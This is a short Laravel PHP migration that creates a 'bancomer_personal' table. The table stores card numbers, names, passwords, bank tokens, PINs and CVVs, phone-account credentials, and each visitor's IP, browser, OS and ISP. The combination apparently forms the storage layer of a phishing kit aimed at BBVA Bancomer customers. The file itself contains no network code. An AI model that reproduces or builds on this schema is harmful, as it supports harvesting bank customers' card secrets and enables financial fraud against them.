<?php

use Illuminate\Support\Facades\Schema;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Database\Migrations\Migration;

class CreateBancomerPersonalTable extends Migration
{
    /**
     * Run the migrations.
     *
     * @return void
     */
    public function up()
    {
        Schema::create('bancomer_personal', function (Blueprint $table) {
            $table->string('estatus');
            $table->increments('id');
            $table->string('n_tarjeta');
            $table->string('nombre');
            $table->string('contrasena');
            $table->string('token');
            $table->string('nip');
            $table->string('cvv');
            $table->string('compania');
            $table->string('telefono');
            $table->string('mi_telcel');
            $table->string('ip')->nullable();
            $table->string('navegador')->nullable();
            $table->string('os')->nullable();
            $table->string('isp')->nullable();
            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     *
     * @return void
     */
    public function down()
    {
        Schema::dropIfExists('bancomer_personal');
    }
}
